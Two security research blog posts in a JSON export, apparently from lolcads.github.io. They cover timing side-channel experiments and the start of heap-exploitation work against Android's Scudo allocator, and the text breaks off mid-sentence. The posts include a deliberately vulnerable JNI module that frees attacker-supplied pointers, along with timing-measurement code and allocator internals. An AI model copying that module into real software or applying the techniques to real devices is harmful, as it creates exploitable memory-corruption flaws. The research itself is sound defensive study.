[{"categories":null,"content":"Attempting Timing Attacks against Scudo In this second blog post we will take a different approach for attacking Scudo , i.e. we will try to the measure execution times for calls to malloc and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1 .\nThere will be almost only negative results (which means I unfortunately could not make it work), except for one. The main conclusion we can draw from this post is that Scudo is not designed to mitigate timing attacks! This follows from trying to leak a piece of information and then accidentally leaking a different and unclassified piece.\nDisclaimer: The following analyses can be incomplete and/or incorrect. Also the experiments conducted are on a very basic level compared to the complex field of Data Science. The style of this post is informal and chosen based on the idea of practical attacks on Android.\nExperimental Setup As usual, there is a module for the damnvulnerableapp of the form:\nJNIEXPORT jbyteArray JNICALL Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage(JNIEnv *env, jclass class, jbyteArray message) { uint32_t length = (*env)-\u0026gt;GetArrayLength(env, message); if (length == 0) return NULL; jbyte *raw = (*env)-\u0026gt;GetByteArrayElements(env, message, NULL); if (raw) { jbyteArray result = (*env)-\u0026gt;NewByteArray(env, 8); switch (raw[0]) { case 0: { // Malloc uint64_t size = *((uint64_t*)\u0026amp;raw[1]); uint8_t *ptr; ptr = malloc(size); (*env)-\u0026gt;SetByteArrayRegion(env, result, 0, 8, (jbyte*)\u0026amp;ptr); break; } case 1: { // Free uint8_t *ptr = (uint8_t*)(*(uint64_t*)\u0026amp;raw[1]); free(ptr); (*env)-\u0026gt;SetByteArrayRegion(env, result, 0, 8, (jbyte*)\u0026amp;ptr); break; } } return result; } return NULL; } This module lets the user directly control whether and how to call malloc and free, or, to be more precise, Allocator::allocate and Allocator::deallocate . The input is composed like this: \u0026lt;func id\u0026gt;\u0026lt;size | ptr\u0026gt; (9 bytes).\ndamnvulnerableapp is run in an x86-64 emulator (Pixel 3) running Android 12 and forwards remote user requests to the above module. It is already expected to see a lot of timing noise based on this setup.\nNotice that measuring execution time of a remote call to e.g. malloc(0x10) (primary allocation) will actually measure execution time of a call to Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage, which is called from Java.\nAs regards the client used to communicate with the app, it is written in C, thus it is expected to run faster than the former Python client. Because damnvulnerableapp uses a request - response model, i.e. a client has to request e.g. malloc(0x10), gets a response that the request \u0026ldquo;worked\u0026rdquo; and then has to fetch the result with a second request, the time measurements are conducted as follows:\nstruct timespec before; struct timespec after; ... // Request malloc(0x10) app_forward(fd, (uint8_t*)message, 9, \u0026amp;buffer, \u0026amp;buffer_length, \u0026amp;before); // Free response buffer free(buffer); // Request result of malloc(0x10) app_fetch(fd, \u0026amp;buffer, \u0026amp;buffer_length, \u0026amp;after); // Extract result from response pointer = *(uint64_t*)get_content(buffer, buffer_length); // Free response buffer free(buffer); ... app_fetch and app_forward (internally call app_send_formatted) are the core of this client:\nenum error_code app_fetch(...) { ... result = app_send_formatted(fd, \u0026#34;CONTENT\u0026#34;, \u0026#34;FETCH\u0026#34;, (uint8_t*)\u0026#34;\u0026#34;, 0, NULL); if (result != error_success) { log_error(\u0026#34;Failed to forward buffer\u0026#34;); return result; } result = app_full_read(fd, buffer, buffer_size); if (result != error_success) { log_error(\u0026#34;Failed to read response to forward\u0026#34;); return result; } // Measure time after fetching result if (after_receive != NULL) clock_gettime(CLOCK_THREAD_CPUTIME_ID, after_receive); ... } enum error_code app_send_formatted(...) { ... // Measure time before forwarding message if (before_send != NULL) clock_gettime(CLOCK_THREAD_CPUTIME_ID, before_send); result = app_full_write(fd, buffer, buffer_size + content_length); free(buffer); if (result != error_success) { log_error(\u0026#34;Failed to send request\u0026#34;); return result; } ... } Because of the request - response model, there is additional noise introduced by being forced to make two remote requests for one e.g. malloc(0x10)!\nLets again summarize expected sources of noise introduced by the experimental setup:\nAndroid OS is emulated and therefore does not behave like an Android OS running on a \u0026ldquo;real\u0026rdquo; device (e.g. in terms of CPU power and scheduling) Remote access to damnvulnerableapp. Although the emulator that runs the app is launched within the same device we will perform the measurements with, this is an additional layer of indirection. Call to e.g. malloc is actually a call to handleMessage, which has to be invoked from Java. The call stack is pretty deep\u0026hellip; Two requests per operation Timing Attacks In this section, timing attacks on different targets within Scudo will be discussed.\nAttacking Chunks Array The core idea is to abuse a timing side channel on Allocator::allocate, i.e. calling malloc in damnvulnerableapp. C-\u0026gt;Count will be the target of the attack, i.e. based on the measured execution times, we try to estimate the value of C-\u0026gt;Count.\nOne may ask, why C-\u0026gt;Count is interesting. There are two reasons:\nThe chunk arrays are shuffled to, among other things, prevent an attacker from predicting where the next allocated chunk will be located. E.g. this can prevent heap overflows. Knowing C-\u0026gt;Count looks like the first natural step to predicting how the array looks like in terms of address ordering. SizeClassAllocatorLocalCache::allocate contains a classical pattern for a timing side channel: void *allocate(uptr ClassId) { ... PerClass *C = \u0026amp;PerClassArray[ClassId]; if (C-\u0026gt;Count == 0) { // If C-\u0026gt;Count = 0, then execution time is longer than \u0026#34;usual\u0026#34; ... refill(C, ClassId); ... } // The rest is very fast ... CompactPtrT CompactP = C-\u0026gt;Chunks[--C-\u0026gt;Count]; ... return Allocator-\u0026gt;decompactPtr(ClassId, CompactP); } When allocating memory from the primary allocator via e.g. malloc(0x10), then there is a number of allocations that will result in triggering C-\u0026gt;Count == 0 , which again triggers execution of refill . Afterwards, assuming that batches are only pushed back through drain or are newly allocated via map , we can distinguish the following cases for C-\u0026gt;Count:\nC-\u0026gt;Count = C-\u0026gt;MaxCount / 2 . This stems from the fact that deallocate can create batches if the corresponding Chunks array is full. To be precise, this will trigger the execution of drain , where C-\u0026gt;Count = C-\u0026gt;MaxCount. Therefore the minimum Count = Min(C-\u0026gt;MaxCount / 2, C-\u0026gt;Count) in drain will evaluate to 0 \u0026lt; C-\u0026gt;MaxCount / 2 \u0026lt; C-\u0026gt;MaxCount. Finally, C-\u0026gt;Count -= Count \u0026lt;=\u0026gt; C-\u0026gt;Count = C-\u0026gt;MaxCount - C-\u0026gt;MaxCount / 2 = C-\u0026gt;MaxCount / 2. Notice that C-\u0026gt;MaxCount = 2 * TransferBatch::getMaxCached(Size) . As can be seen in the next step, for malloc(0x10), this will result in C-\u0026gt;MaxCount = 2 * 13 = 26 =\u0026gt; C-\u0026gt;Count = 26 / 2 = 13. C-\u0026gt;Count = MaxCount , i.e.: C-\u0026gt;Count = MaxCount = TransferBatch::getMaxCached(Size) = Min(MaxNumCached, SizeClassMap::getMaxCachedHint(Size)) = Min(13, Max(1U, Min(Config::MaxNumCachedHint, N))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; Config::MaxBytesCachedLog) / static_cast\u0026lt;u32\u0026gt;(Size)))) = Min(13, Max(1U, Min(13, (1U \u0026lt;\u0026lt; 13) / Classes[ClassId - 1]))) where Classes :\nstatic constexpr u32 Classes[] = { 0x00020, 0x00030, 0x00040, 0x00050, 0x00060, 0x00070, 0x00080, 0x00090, 0x000a0, 0x000b0, 0x000c0, 0x000e0, 0x000f0, 0x00110, 0x00120, 0x00130, 0x00150, 0x00160, 0x00170, 0x00190, 0x001d0, 0x00210, 0x00240, 0x002a0, 0x00330, 0x00370, 0x003a0, 0x00400, 0x00430, 0x004a0, 0x00530, 0x00610, 0x00730, 0x00840, 0x00910, 0x009c0, 0x00a60, 0x00b10, 0x00ca0, 0x00e00, 0x00fb0, 0x01030, 0x01130, 0x011f0, 0x01490, 0x01650, 0x01930, 0x02010, 0x02190, 0x02490, 0x02850, 0x02d50, 0x03010, 0x03210, 0x03c90, 0x04090, 0x04510, 0x04810, 0x05c10, 0x06f10, 0x07310, 0x08010, 0x0c010, 0x10010, }; So for a small allocation, i.e. for ClassId = 1, we get:\nC-\u0026gt;Count = Min(13, Max(1U, Min(13, 0x2000 / 0x20))) = Min(13, Max(1U, Min(13, 256))) = Min(13, Max(1U, 13)) = 13 Notice that C-\u0026gt;Count = MaxCount is true for all batches added to FreeList except for the last one, because N depends on a minimum:\nfor (u32 I = 0; I \u0026lt; NumberOfBlocks;) { TransferBatch *B = C-\u0026gt;createBatch(ClassId, reinterpret_cast\u0026lt;void *\u0026gt;(decompactPtrInternal( CompactPtrBase, ShuffleArray[I]))); if (UNLIKELY(!B)) return nullptr; const u32 N = Min(MaxCount, NumberOfBlocks - I); // If (NumberOfBlocks - I \u0026lt; MaxCount) =\u0026gt; last iteration B-\u0026gt;setFromArray(\u0026amp;ShuffleArray[I], N); Region-\u0026gt;FreeList.push_back(B); I += N; } Single - Threaded Timing - Based Side Channel Attack on Primary Assuming that the only thread that accesses the Scudo primary for allocations of the form malloc(0x10) can be convinced to run this allocation with a constant, computable overhead. Then, the following attack might enable the prediction of C-\u0026gt;Count based on measures of elapsed time:\nIn iteration j perform 13 allocations (assuming classid 1 allocations, i.e. malloc(0x10)). For each allocation let x_{i,j} be the measured execution time (so 0 \u0026lt;= i \u0026lt;= 12). Add x_{i,j} to the list X_i. After 0 \u0026lt;= j \u0026lt; num_iterations 13 - chunk allocations, compute the average over each list. Let x_i' be the average of X_i Let k := argmax_{0\u0026lt;=i\u0026lt;=12} x_i' Return k Consider the following visualization: From the diagram we can see that C-\u0026gt;Count = 4. Now, if we start measuring the execution times, i.e. we get x_{0,0} for C-\u0026gt;Count = 4, x_{1,0} for C-\u0026gt;Count = 3 etc. we can see that for C-\u0026gt;Count = 0 x_{4,0} is the biggest value. Therefore, right after allocate returns, the result k = 4 of the above attack corresponds to the index of the biggest value x_{4,0}. Note that the second index is used to perform the 13 allocations multiple times in order to cancel out noise using the mean. Also, assuming that each call to malloc via handleMessage is only triggering this very malloc, i.e. there is no other call to malloc that influences C-\u0026gt;Count, after the attack C-\u0026gt;Count takes the same value it had before performing the attack (because C-\u0026gt;Count is in mod 13 and we run 13 * num_iterations allocations, which is divisible by 13).\nBefore the above attack, it may be beneficial to run a few allocations to ensure that populateFreeList is called. This will result in 13 chunks being available in C-\u0026gt;Chunks and thus C-\u0026gt;Count = 13 right after refill and C-\u0026gt;Count = 12 right after allocate returns.\nThe main problem is that the assumptions are too strong for this attack to work on a real - world app. I.e. there are multiple threads that run malloc(0x10). Therefore, the timings measured from the perspective of a single thread may be influenced by the following:\nThread synchronization in Allocator::allocate . I.e. if there is another thread currently allocating memory via the primary, then our thread is forced to wait until the critical section is unlocked. Between two calls to malloc(0x10), there may be an arbitrary amount of threads that run malloc(0x10) due to scheduling. Therefore, the above attack, which assumes to be able to run 13 consecutive allocations in a row, is unlikely to work. This basically poisons the averages, which makes all of them look almost the same! Remote call to malloc can trigger multiple allocations! Therefore, one measurement might decrease C-\u0026gt;Count by two or more instead of one. Multithreaded Timing - Based Side Channel Attacks on Primary This section describes different approaches that aim to predict C-\u0026gt;Count based on measured timings in a multithreaded environment.\nLearn Distribution from Leaked Counts Let c_i for 0 \u0026lt;= i \u0026lt; n be the leaked values for C-\u0026gt;Count from one thread (with fixed TSD) right before each malloc(0x10). Notice that due to multithreading, this leaked value might differ from the value that is used in the following malloc call. We assume that the probability for this is negligible though.\nThen compute for 0 \u0026lt;= i \u0026lt; n-1 the difference of the C-\u0026gt;Count values, i.e. d_i = -(c_{i+1} - c_{i}) mod 13. With high probability, the d_i represent the amount of malloc(0x10) calls performed by other threads between each pair of malloc(0x10) calls performed by our thread. Remember that the c_i are leaked from our main thread.\nConstruct the probability distribution according to the frequencies of the d_i values. It is expected to be binomially distributed. Then, apply those probabilities to the timings. I.e. between each consecutive pair of time measurements x_i and x_{i+1} there is a random variable D_i distributed according to the above distribution.\nAssuming we have a sequence of values for C-\u0026gt;Count that is unknown, then every element in this unknown sequence can be represented as a random variable. To be precise, letting C_i be the random variables representing the C-\u0026gt;Count before the i-th malloc(0x10):\nC_{i+1} = C_i + D_i = C_i + D // for all i: D_i are iid., so D~freq{d_i} is enough Assuming that there is an anchor point, i.e. there exists a constant value 0 \u0026lt;= C_0 \u0026lt; 13 that is the first value for C-\u0026gt;Count, then\nC_{i+1} = C_i + D = (((C_0 + D) + D) + ... ) + D = C_0 + (i + 1) * D =\u0026gt; E[C_{i+1}] = C_0 + (i+1) * E[D] = C_0 + (i+1) * (1/(n-1) * sum(d_i)) Given a sequence of timings x_i for 0 \u0026lt;= i \u0026lt; m measured by calling malloc(0x10), we could try to identify an anchor point, i.e. a point where refill was triggered by e.g. taking max(x_i). If we get x_k = max(x_i), then we performed k + 1 allocations in order to get to this maximum value. Therefore, we could try to compute E[C_k] to get the expected value for C-\u0026gt;Count, which is based on the above formula.\nUnfortunately, there are some problems with this approach:\nDoes not take into account that other threads still run malloc(0x10) in the background. Although this approach might work for computing the most probable value for C-\u0026gt;Count, it would be invalidated the moment another thread called malloc(0x10). Probabilistic approach\u0026hellip;in practice, this will most likely not be that much better than just guessing the value, because there are only so few possible values C-\u0026gt;Count can take. Learn Thresholds Another approach is to learn thresholds that distinguish a \u0026ldquo;refill - timing\u0026rdquo; from any other timing. Thus we will try to \u0026ldquo;learn\u0026rdquo; a threshold that allows for separating timings into either \u0026ldquo;refill\u0026rdquo; or \u0026ldquo;non - refill\u0026rdquo;. Although this approach might be too \u0026ldquo;simple\u0026rdquo;, because the problem can also be interpreted as distinguishing at least two guassian distributions, we can give it a try.\nInitially, every thread is assigned to a TSD (linked to a cache, i.e. the Chunks array used in e.g. allocate , which is based on the primary) in a round - robin fashion . As experience showed that the app often has at least 20 threads, and NumberOfTSDs is either DefaultTSDCount = 2 or getNumberOfCPUs , which on the test system can at most be 8, we can conclude that there are multiple threads referencing the same TSD. This is still better than having all threads sharing a single TSD!\nAs the UAF module (see previous posts on Use - After - Free) suggests that the current TSD of the JNI thread \u0026ldquo;rarely\u0026rdquo; changes (due to exploitation of the UAF module working almost always), in the following we will assume that we use the same TSD. We will also assume that there either is no other thread that references the current TSD or is at least one such thread, but this thread does not allocate often from the primary with classid 1.\nPerforming only primary allocations of size 0x10, i.e. repeatedly calling a JNI function that calls malloc(0x10), results in the following plot: Further analysis of this plot reveals the following issues:\nThere might exist 3 distinct distributions. I.e. it is possible to almost reliably (i.e. with high probability (whp)) differentiate between three different kinds of timings. This suggests that the types of timings are:\nrefill is called. Expected to be linked to the distribution with the highest mean. popBatch has a batch in the free list popBatch has to call populateFreeList \u0026ndash;\u0026gt; expected to take a lot of time. getTSDAndLock takes longer, i.e. synchronization blocks execution. allocate instantly returns a chunk. Notice that currently, there is NO CERTAIN MAPPING between the first two types of timings and the two distributions with the highest means. However, whp. the distribution with the lowest mean is linked to the event that allocate instantly returns a chunk.\nAssuming the distribution with the smallest mean is linked to the event that allocate instantly returns a chunk and that at least one distribution is caused by multithreading, then with probability at least min(1394 / 4000, 1787 / 4000) = min(0.3485, 0.44675) the TSD is shared with another thread.\nAnother \u0026ldquo;distortion\u0026rdquo; that could appear, but is very improbable, is that crc32 calculation takes very long for specific values. As this has been empirically tested, this can be ruled out for now (I searched for values, which cause long execution times in the crc32 instruction\u0026hellip; without success).\nCalling JNI functions can non - deterministically cause longer execution times e.g. by calling malloc internally.\nIf the amount of points in the two distributions with the highest means are proportional to the total amount of points, then this rules out the possibility that the free list is filled with a lot of batches initially, because there can only be a constant amount of batches initially stored in the free list. Therefore, increasing the amount of allocations will reveal whether the amount of points in both distributions grows with the amount of allocations.\nAlso, notice that our thread will permanently allocate memory via malloc(0x10). If there was another thread that freed memory using free on previously allocated classid - 1 chunks (assuming no memory leaks), then this cannot create a new batch, i.e. result in drain and therefore pushBatch being called, because our thread will not call free at all (of course there might be implicit calls to free, but they would not be part of Scudo). In addition to that, as Java threads have a 1 - 1 mapping with user - level threads (pthread_create), there cannot be multiple threads running handleMessage.\nInterestingly, it turns out that one call to the JNI function may cause multiple internal malloc calls from the same or a TSD - sharing thread. E.g., if each remote malloc resulted in two malloc calls, i.e. one internal call and the call we requested, then, assuming C-\u0026gt;Count \u0026lt; 13, there will be six fast calls and one slow call. The timings used for analysis so far may contain multiple malloc calls, which explains the existence of three distributions. Two of those three distributions are actually the same only with shifted means, one contains the timings with only one malloc, the other one with two calls to malloc. This is due to the fact that handleMessage seems to call malloc at most twice, but at least once. Therefore, the distributions with the smallest and biggest means seem to represent one malloc and two mallocs without refill respectively, whereas the \u0026ldquo;middle\u0026rdquo; distribution seems to represent a single allocation with refill\u0026hellip;although this does not really make sense, because there would have to be a lot of refills\u0026hellip;\nIn order to prove that synchronization is an issue and that one call to handleMessage can cause two malloc calls, consider the following analysis (performed via gdb):\n\u0026lt;Index of handleMessage call\u0026gt;(length = \u0026lt;amount cache allocations per handleMessage\u0026gt;): \u0026lt;Thread ID\u0026gt;: count=\u0026lt;C-\u0026gt;Count value\u0026gt;, id=\u0026lt;Class ID\u0026gt; 0(length = 0): 1(length = 1): 20: count=0xb, id=0x00000020 2(length = 2): 20: count=0xa, id=0x00000020 20: count=0x9, id=0x00000020 3(length = 1): 20: count=0x8, id=0x00000020 4(length = 2): 20: count=0x7, id=0x00000020 20: count=0x6, id=0x00000020 5(length = 0): 6(length = 0): 7(length = 2): 20: count=0x5, id=0x00000020 20: count=0x4, id=0x00000020 8(length = 2): 20: count=0x3, id=0x00000020 20: count=0x2, id=0x00000020 9(length = 1): 20: count=0x1, id=0x00000020 10(length = 1): 20: count=0x0, id=0x00000020 11(length = 1): 20: count=0xc, id=0x00000020 12(length = 1): 20: count=0xb, id=0x00000020 13(length = 0): 14(length = 2): 20: count=0xa, id=0x00000020 20: count=0x9, id=0x00000020 15(length = 0): 16(length = 0): 17(length = 1): 20: count=0x8, id=0x00000020 18(length = 1): 20: count=0x7, id=0x00000020 19(length = 0): 20(length = 2): 20: count=0x6, id=0x00000020 20: count=0x5, id=0x00000020 21(length = 1): 20: count=0x4, id=0x00000020 22(length = 1): 20: count=0x3, id=0x00000020 23(length = 0): 24(length = 1): 20: count=0x2, id=0x00000020 25(length = 1): 20: count=0x1, id=0x00000020 26(length = 0): 27(length = 2): 20: count=0x0, id=0x00000020 20: count=0xc, id=0x00000020 28(length = 1): 20: count=0xb, id=0x00000020 29(length = 1): 20: count=0xa, id=0x00000020 30(length = 0): 31(length = 0): 32(length = 2): 20: count=0x9, id=0x00000020 20: count=0x8, id=0x00000020 33(length = 1): 20: count=0x7, id=0x00000020 34(length = 1): 20: count=0x6, id=0x00000020 35(length = 3): 20: count=0x5, id=0x00000020 5: count=0x5, id=0x00000020 20: count=0x4, id=0x00000020 36(length = 2): 20: count=0x3, id=0x00000020 20: count=0x2, id=0x00000020 37(length = 2): 20: count=0x1, id=0x00000020 20: count=0x0, id=0x00000020 38(length = 2): 20: count=0xc, id=0x00000020 20: count=0xb, id=0x00000020 39(length = 2): 20: count=0xa, id=0x00000020 20: count=0x9, id=0x00000020 40(length = 0): 41(length = 0): 42(length = 1): 20: count=0x8, id=0x00000020 43(length = 1): 20: count=0x7, id=0x00000020 44(length = 2): 20: count=0x6, id=0x00000020 20: count=0x5, id=0x00000020 45(length = 0): 46(length = 0): 47(length = 1): 20: count=0x4, id=0x00000020 48(length = 0): 49(length = 1): 20: count=0x3, id=0x00000020 50(length = 1): 20: count=0x2, id=0x00000020 51(length = 1): 20: count=0x1, id=0x00000020 52(length = 2): 20: count=0x0, id=0x00000020 20: count=0xc, id=0x00000020 53(length = 0): 54(length = 0): 55(length = 0): 56(length = 1): 20: count=0xb, id=0x00000020 57(length = 1): 20: count=0xa, id=0x00000020 58(length = 1): 20: count=0x9, id=0x00000020 59(length = 2): 20: count=0x8, id=0x00000020 20: count=0x7, id=0x00000020 60(length = 0): 61(length = 2): 20: count=0x6, id=0x00000020 20: count=0x5, id=0x00000020 62(length = 0): 63(length = 0): 64(length = 0): 65(length = 0): 66(length = 1): 20: count=0x4, id=0x00000020 67(length = 1): 20: count=0x3, id=0x00000020 68(length = 1): 20: count=0x2, id=0x00000020 69(length = 0): 70(length = 1): 20: count=0x1, id=0x00000020 71(length = 0): 72(length = 1): 20: count=0x0, id=0x00000020 73(length = 1): 20: count=0xc, id=0x00000020 74(length = 1): 20: count=0xb, id=0x00000020 75(length = 1): 20: count=0xa, id=0x00000020 76(length = 2): 20: count=0x9, id=0x00000020 20: count=0x8, id=0x00000020 77(length = 2): 20: count=0x7, id=0x00000020 20: count=0x6, id=0x00000020 78(length = 8): 5: count=0x5, id=0x00000020 5: count=0x4, id=0x00000020 5: count=0x3, id=0x00000020 5: count=0x2, id=0x00000020 5: count=0x2, id=0x00000020 5: count=0x2, id=0x00000020 5: count=0x2, id=0x00000020 20: count=0x4, id=0x00000020 79(length = 3): 5: count=0x4, id=0x00000020 20: count=0x4, id=0x00000020 20: count=0x3, id=0x00000020 80(length = 1): 20: count=0x2, id=0x00000020 81(length = 2): 20: count=0x1, id=0x00000020 20: count=0x0, id=0x00000020 82(length = 1): 20: count=0xc, id=0x00000020 83(length = 2): 20: count=0xb, id=0x00000020 20: count=0xa, id=0x00000020 84(length = 2): 20: count=0x9, id=0x00000020 20: count=0x8, id=0x00000020 85(length = 0): 86(length = 2): 20: count=0x7, id=0x00000020 20: count=0x6, id=0x00000020 87(length = 1): 20: count=0x5, id=0x00000020 88(length = 1): 20: count=0x4, id=0x00000020 89(length = 1): 20: count=0x3, id=0x00000020 90(length = 1): 20: count=0x2, id=0x00000020 91(length = 0): 92(length = 0): 93(length = 1): 20: count=0x1, id=0x00000020 94(length = 2): 20: count=0x0, id=0x00000020 20: count=0xc, id=0x00000020 95(length = 2): 20: count=0xb, id=0x00000020 20: count=0xa, id=0x00000020 96(length = 0): 97(length = 1): 20: count=0x9, id=0x00000020 Thread 20 is the main thread calling handleMessage. Its allocations are interleaved with allocations from thread 5. Notice that there are no inconsistencies in the above measurement, although it seems impossible for count to stay the same. This is due to thread 5 calling free in between calls to malloc.\nTherefore, there is at least one other thread sharing the same TSD as our thread. As execution in gdb is \u0026ldquo;weird\u0026rdquo; sometimes, it can be assumed that multi - threading is even worse if no debugger is present. Overall, with at least one other thread interleaving and with uncertainty whether one call to handleMessage results in one or two calls to malloc, there seems to be no clear path to derive the actual value for C-\u0026gt;Count.\nAnalysing Accurate Measurements Performing timing analysis on the actual device, i.e. in the form of\nclock_gettime(CLOCK_THREAD_CPUTIME_ID, \u0026amp;before); ptr = malloc(size); clock_gettime(CLOCK_THREAD_CPUTIME_ID, \u0026amp;after); elapsed = (after.tv_sec * NS_PER_SECOND + after.tv_nsec) - (before.tv_sec * NS_PER_SECOND + before.tv_nsec); reveals an interesting and quite natural result: Mapping three distributions to the same set of measurements yields: .\nNotice that these measurements are stripped off multiple layers of noise:\nNoise introduced by remote communication Noise introduced by an arbitrary amount of function calls required for e.g. setting up a JNI call. Some synchronization of threads. Notice that measuring the elapsed time for malloc(0x10) directly requires no further data fetching and therefore less threads are involved\u0026hellip; Attacking Secondary Cache Naturally, we could also try to attack the secondary cache via a timing attack. As with classical cache - based side channel attacks, we would expect:\nfast execution time, if entry is in cache, i.e. cache hit slow execution time, if entry is not in cache, i.e. cache miss Unfortunately, my experiments have been shut down by the fact that there is only one secondary for all threads. From experience, damnvulnerableapp:VulnerableActivity uses at least 20 threads. The experiment consisted of two events, i.e. cache hit and cache miss:\ncache hit:\nFor the experiment, we repeat n times:\nAllocate chunk via secondary Free chunk Measure time required in 1. From the second iteration onwards, assuming no other threads steals the freed chunk from the cache, allocations are assumed to be fast. Statistics are taken over 400 measurements (repeated three times):\navg = 351142.4975, var = 6215682405.529994, standard dev = 78839.59922228166; Without first: avg = 350635.6090225564, var = 6128486185.496259, standard dev = 78284.64846632614` avg = 293603.4925, var = 9048178621.879944, standard dev = 95121.91451963078; Without first entry: 292885.1203007519, 8864432314.622118, 94151.11425056061 avg = 343784.9075, var = 8457856232.698944, standard dev = 91966.60389890966; Without first entry: 343308.24812030076, 8388172201.665255, 91586.96523886603 cache miss:\nFor the experiment, we repeat n times:\nAllocate chunk via secondary Measure time required in 1. In the worst case, the first 32 allocations are covered by cache entries. Assuming that no other thread frees a lot of memory that results in chunks, which cover our requests, we end up with the following results (over 400 measurements, repeated twice):\navg = 353609.1975, var = 7648425849.838493, standard dev = 87455.27914219069; Without first 32 entries: 354754.0652173913, 7595866298.691399, 87154.26724315567 avg = 320303.5725, var = 7655033941.299744, standard dev = 87493.05081719201; Without first 32 entries: 320182.16576086957, 7793835282.176328, 88282.70092252687 As can be seen from the repeated experiments, there seems to be no clear way for distinguishing secondary cache hits and misses. This might be due to the fact that there are roughly 20 threads sharing the same 32 cache entries! If we knew the distribution behind some random variable X that represents the amount of secondary allocate calls done in between two allocations performed by our thread, then we might be able to derive a probability distribution on the measured timings and maybe derive the most probable outcome, i.e. either cache hit or miss. But this seems like a rabbit hole, i.e. it does not seem to help in exploiting Scudo.\nConclusion So, what is the result of the above \u0026ldquo;attacks\u0026rdquo; that do not really achieve anything\u0026hellip; Well, I argue that we actually achieved something without knowing that we achieved it, i.e. we can identify whether there are sometimes one and sometimes two calls to malloc when running handleMessage.\nRecall the visualization of the measurements: Of course, the above diagram is composed of measuring only 4000 execution times. Still, we can tell whether a new time measurement belongs to either the red or the blue distribution with high probability, if the assumption is correct that the red and blue distributions represent one and two calls to malloc, respectively! Adding to the pile, being able to distinguish time measurements like shown in the diagram suggests that there is some underlying information to be extracted. Notice that the distributions shown in the diagram come from time measurements taken over a JNI call and not a malloc call directly!\nAs can be seen from the measurements taken locally , Scudo leaks information through execution times and thus is not designed to mitigate timing attacks. Further analyses are required to apply and evaluate the whole potential of side channel attacks on Scudo.\nUnfortunately, I am neither a data scientist nor an expert in statistics or side channel attacks. Hence, the analyses conducted in this blog post are very basic and, again, might be incorrect and/or incomplete.\nTherefore, attacking Scudo in terms of timing attacks has to be postponed until a corresponding expert joins the game.\n","permalink":"https://lolcads.github.io/posts/2024/07/scudo_1/","tags":["Android","Side Channel Attack","Timing Attack","JNI","DamnVulnerableApp","Scudo","Heap Exploitation"],"title":"Timing Attack Experiments against Scudo (Part 2)"},{"categories":null,"content":"Binary Exploitation for Scudo Heap Allocator on Android In this series of blog posts, we will investigate how an attacker may leverage the internals of the Scudo Allocator in order to obtain an advantage on an Android OS. To that end, necessary prerequisites will be discussed and analysed for their likelihood. The focus will primarily be on malloc and free , although realloc and other functions may also be of interest. According to source code , the Scudo version considered in this blog is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.\nIf you have no idea about the fundamentals of Scudo, try reading the linked code! The followup blog post discusses timing side channel attacks on Scudo and requires some of the basics discussed in this post.\nNecessary Assumptions Up to this point, no \u0026ldquo;easy\u0026rdquo; way of bypassing the checks in the implementations of malloc and free has been found. Therefore it will be unavoidable to assume that certain events have happened already.\nThe key observation is that every chunk header is protected by a checksum, which is verified for every chunk that is passed to free via Chunk::loadHeader(Cookie, Ptr, \u0026amp;Header) . The computations performed when calculating the checksum are architecture - dependent. Therefore, we assume an Intel architecture, i.e. the checksum computation is based on the crc32 instruction.\nThe checksum depends on\na random 32-bit value named Cookie a pointer to the user data. This pointer is pointing to the memory located right after the chunk header. the header of the chunk. The checksum is computed over the header with a zeroed - out checksum field. Also, as Zygote forks itself when creating a new app, global variables of shared - object files that are already loaded into Zygote will remain constant until Zygote is restarted. A list of loaded shared - object files can be seen below:\n$ readelf -d /proc/$(pidof zygote64)/exe | grep NEEDED 0x0000000000000001 (NEEDED) Shared library: [libandroid_runtime.so] 0x0000000000000001 (NEEDED) Shared library: [libbinder.so] 0x0000000000000001 (NEEDED) Shared library: [libcutils.so] 0x0000000000000001 (NEEDED) Shared library: [libhidlbase.so] 0x0000000000000001 (NEEDED) Shared library: [liblog.so] 0x0000000000000001 (NEEDED) Shared library: [libnativeloader.so] 0x0000000000000001 (NEEDED) Shared library: [libsigchain.so] 0x0000000000000001 (NEEDED) Shared library: [libutils.so] 0x0000000000000001 (NEEDED) Shared library: [libwilhelm.so] 0x0000000000000001 (NEEDED) Shared library: [libc++.so] 0x0000000000000001 (NEEDED) Shared library: [libc.so] 0x0000000000000001 (NEEDED) Shared library: [libm.so] 0x0000000000000001 (NEEDED) Shared library: [libdl.so] $ cat /proc/$(pidof zygote64)/maps | grep libc.so 730eb404b000-730eb408f000 r--p 00000000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so 730eb408f000-730eb411d000 r-xp 00043000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so 730eb411d000-730eb4122000 r--p 000d0000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so 730eb4122000-730eb4123000 rw-p 000d4000 07:60 21 /apex/com.android.runtime/lib64/bionic/libc.so $ readelf -s /apex/com.android.runtime/lib64/bionic/libc.so | grep -e \u0026#34; scudo_malloc\u0026#34; ... 199: 000000000004a0f0 55 FUNC LOCAL DEFAULT 14 scudo_malloc ... Thus, Scudo is implemented in libc.so. Therefore it can be expected that the global variable SCUDO_ALLOCATOR , which is used to implement scudo_malloc and so on, is the same across all apps forked from Zygote. SCUDO_ALLOCATOR is nothing but an instance of scudo::Allocator , which contains the field named Cookie . Hence, the Allocator::Cookie field can be expected to be the same across all apps forked from Zygote.\nSo we need to get the cookie once (per system restart) and we will be able to exploit Scudo/Heap - related vulnerabilities as long as we know necessary pointers. Unless stated otherwise, in the following sections we will always assume that we are given sufficient leaks to compute correct checksums!\nClassical Information Leak Attacks on checksum computation are already out there, e.g. it has been possible to compute the Cookie from a pointer and header leak (the header contains a valid checksum!) by reformulating the checksum computation as a set of SMT equations . Unfortunately, comparing the implementation attacked with the implementation we are facing, we can observe that\nIntel uses a custom generator polynomial to implement crc32 (see Intel Manual Vol. 2). I.e. poly = 0x11EDC6F41 instead of the standardized 0x0104C11DB7 . Checksum computation in our cases applies an additional xor in order to reduce the checksum size. It has not been possible to derive a lookup table for Intel\u0026rsquo;s crc32 implementation. If it had been successful, maybe the SMT attack would have worked. Other attacks involving symbolic execution (via klee based on this have also not been successful\u0026hellip;). Still, there is another approach to go 